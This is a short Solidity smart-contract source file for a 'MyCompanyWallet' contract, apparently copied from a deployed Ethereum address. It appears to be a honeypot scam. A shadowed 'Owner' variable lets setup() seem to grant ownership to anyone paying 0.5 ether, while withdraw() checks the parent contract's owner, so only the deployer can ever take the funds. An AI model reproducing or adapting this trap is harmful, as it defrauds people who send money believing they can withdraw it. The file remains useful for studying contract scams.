/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MyCompanyWallet at 0x78faf034c61f4158a4a12bfa372187a21405ae33
*/
pragma solidity ^0.4.24;

contract Ownable {
    address public Owner = msg.sender;
    function isOwner() public returns (bool) {
        if (Owner == msg.sender) {
            return true; 
        }
        return false;
    }
}

contract MyCompanyWallet is Ownable {
    address public Owner;
    
    function setup() public payable {
        if (msg.value >= 0.5 ether) {
            Owner = msg.sender;
        }
    }
    
    function withdraw() public {
        if (isOwner()) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function() public payable { }
}